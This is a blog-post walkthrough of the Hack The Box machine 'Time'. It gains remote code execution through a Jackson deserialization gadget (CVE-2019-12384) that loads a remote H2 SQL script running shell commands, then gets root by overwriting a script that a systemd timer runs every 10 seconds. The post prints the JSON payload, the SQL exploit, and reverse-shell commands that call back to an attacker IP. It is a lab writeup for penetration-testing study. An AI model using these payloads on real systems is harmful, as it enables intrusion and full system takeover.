---
layout: post
title:  "Hack The Box - Time - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Time-Writeup" %}

# Introduction
The hack the box machine "Time" is a Medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about deserialization attacks, systemd timers and Linux file permissions. The most challenge part is, however, to locate the right CVE since there aren't any good indicators for which CVE:s that would work on the target.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover a web application on port 80. The web application can beautify and validate JSON data. By requesting the validation of some JSON data, it is possible to trigger an exception in the backend which discloses that the the Java library [Jackson]() is used to parse the JSON data. It is then possible to use [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384) to get an shell on the target. Thereafter, the privilege escalation can be formed by modifying a script which is executed as `root` every 10 seconds using a systemd timer.

<!-- Check if "beautify" is vulnerable to the CVE-->

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.214`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open.

![nmap](/assets/{{ imgDir }}/nmap.png)

If we navigate to the web application on port 80 in a browser, we are greeted with a web page which can beautify and validate JSON data.

![webapp](/assets/{{ imgDir }}/webapp.png)

![dropdown](/assets/{{ imgDir }}/dropdown.png)

If we expand the dropdown menu, we can see that the validation feature is in a [Beta](https://en.wikipedia.org/wiki/Software_release_life_cycle#Beta) state, meaning that it hasn't been fully developed. Software in a Beta state is normally in a working condition but might contain bugs, making this feature an interesting to study further.

![webappError](/assets/{{ imgDir }}/webappError.png)

If we send a request to validate some JSON data such as `{"key":"value"}`, we receive an error message, as can be seen above. The full error message, shown below, informs that an exception occured in `com.fasterxml.jackson`. This discloses that the backend is using [Jackson](https://github.com/FasterXML/jackson) which is a Java library for deserializing JSON data. 

{% highlight none linenos %}
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
{% endhighlight %}

<!-- TODO: Core -->
After some googling, it is possible to find a couple of CVE:s for the Jackson library. We don't have the exact version of Jackson which means that locating a working exploit is harder. We do, however, know that the `core` part of the library is used based on the error message. One of the CVE:s which abuse the `core` part of the library is [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384). When searching for more information about this vulenrability, it is possible to find a detailed [blog post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html). In the blog post, the author explain that the CVE enables the execution of arbitrary SQL statements when the Jackson library deserializes a JSON object which has the format`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/inject.sql'"}]`. When this JSON data is deserialized, a `DriverManagerConnectionSource` object is created. This object has a paramter named URL which is set to the value `jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/inject.sql'`. This triggers the execution of jdbc and instructs it to download and run some SQL code from the embedded link.

The authors of the blog post also explain that the SQL code below can be used to obtain remote code execution.

{% highlight SQL linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')
{% endhighlight %}

To check if the exploit works, we modify the file to contain a ping command to our host. If we start receiving ICMP packets, we know that we have remote code execution on the target.

{% highlight sql linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping -c 10 10.10.14.4')
{% endhighlight %}

We place the content above in a file named "inject.sql". Then, we execute `python3 -m http.server 80` to start a python web server in the directory where we saved this file and start wireshark by executing `wireshark`. We then paste the malicious JSON object into the form and press "PROCESS".

![sendSSRFPayload](/assets/{{ imgDir }}/sendSSRFPayload.png)

![webServer](/assets/{{ imgDir }}/webServer.png)

After a couple of seconds, the target hosts requests the `inject.sql` file from the python web server. If we look in wireshark, it is possible to see ICMP packets being sent from the target to us. 

![wireshark](/assets/{{ imgDir }}/wireshark.png)

The next step is to acquire a shell. We can execute the reverse shell payload `bash -i >& /dev/tcp/10.10.14.4/443 0>&1` using the SQL file by modifying it as shown below.

{% highlight SQL linenos %}
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.4/443 0>&1')
{% endhighlight %}

![shell](/assets/{{ imgDir }}/shell.png)

Next, we start a netcat listener by executing `nc -lvnp 443` and resend the request which instructs the web application to verify the JSON object `["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/inject.sql'"}]`. After a couple of seconds, the listener receives a connection and we obtain a shell on the target!

<!-- TODO: Vulnerable to both CVE-2019-12384 and CVE-2017-7525? -->
<!-- TODO: I noticed that this box had bad reviews. Reading through the comments, it became evident that this is because of the difficulty of finding the right CVE. However, hacking is not user-friendly. -->

# Privilege Escalation
When enumerating a target for privilege escalation possiblities, it is common to check for cronjobs. These are tasks or scripts which are executed on a regular basis. When searching for scheduled tasks, it is important to not only stop at cronjobs but to also investigate systemd timers. 

Systemd timers are similar to cronjobs in the sense that their main purpose is to run tasks at a specific point in time. A key difference, however, is that systemd timers are more flexible. For example, each timer corresopnds to a systemd service which represents the task that the systemd timer executes when triggered.

<!-- TODO: Try this out in the shell -->
Therefore, systemd timers can be enabled or disabled with the prefix `systemctl enable/disable` and be started or stopped with the prefix `systemtl start/stop`. Apart from this, systemd timers can also be triggered on more complex conditions than cronjobs. For example, it is possible for a systemd timer to execute its corresponding service when a device is plugged into the USB port or a couple of minutes after boot. 

![timers](/assets/{{ imgDir }}/timers.png)

We can enumerate timers by executing `systemctl list-timers --all`. Executing this command on the target results in 12 timers. If we compare the values in the "NEXT" and "LAST" columns, we can deduce how often each timer is triggered. For example, we can deduce that the top-most timer `timer_backup.timer` is executed every 10 seconds and that the second timer `phpsessionclean.timer` is executed every 30 minutes. 

As can be seen in the "ACTIVATES" column, the first timer `timer_backup.timer` activates the service `timer_backup.service`. We can obtain more information about the service by executing `systemctl cat timer_backup.service` to show the contents of its configuration file. This results in the output below which informs us that the service simply restarts another service named "web_backup.service".

<!-- ![find1](/assets/{{ imgDir }}/find1.png) -->

{% highlight none linenos %}
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
{% endhighlight %}

We can execute `systemctl cat web_backup.service` to see how the `web_backup.service` service is configured. From the output of this command, shown below, we can see that the service executes the command `/bin/bash /usr/bin/timer_backup.sh` when it is started. Since we know that this service is restarted every 10 seconds, we know that the `/usr/bin/timer_backup.sh` script is executed every 10 seconds as well.

{% highlight none linenos %}
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
{% endhighlight %}

![timerBackup](/assets/{{ imgDir }}/timerBackup.png)

If we check the file permissions by executing `ls -l /usr/bin/timer_backup.sh`, we can see that we are actually the owner of the file. This means that we have the permissions to change its content! We proceed to execute `echo 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1' > /usr/bin/timer_backup.sh` to overwrite `timer_backup.sh` with our reverse shell payload.

![overwrite](/assets/{{ imgDir }}/overwrite.png)

![root](/assets/{{ imgDir }}/root.png)

Next, we start a netcat listener by executing `nc -lvnp 443` locally. After a couple of seconds, the target connects to the listener and we obtain a shell as the `root` user.

<!-- TODO: How to know that service is executed as root? -->

<!-- ![systemctlCat](/assets/{{ imgDir }}/systemctlCat.png) -->

<!-- We don't know where these files are located. We can search the whole file system for them (quick and dirty way).
![findSH](/assets/{{ imgDir }}/findSH.png)
find / -name web_backup.service 2>/dev/null

timer_backup.service

![find2](/assets/{{ imgDir }}/find2.png)
-->


